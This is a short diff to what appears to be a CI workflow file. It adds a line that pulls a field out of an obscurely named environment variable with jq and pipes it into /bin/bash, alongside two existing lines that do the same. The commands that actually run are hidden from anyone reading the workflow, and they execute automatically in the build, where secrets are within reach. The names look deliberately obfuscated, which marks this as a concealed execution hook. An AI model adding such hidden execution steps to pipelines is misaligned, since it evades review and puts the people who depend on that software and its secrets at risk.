@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$hgkd5" | jq -r .qn78 | /bin/bash
           echo $fghr5 | jq -r .vb72257 | /bin/bash
+          echo $ivvb7 | jq -r .ko93605 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
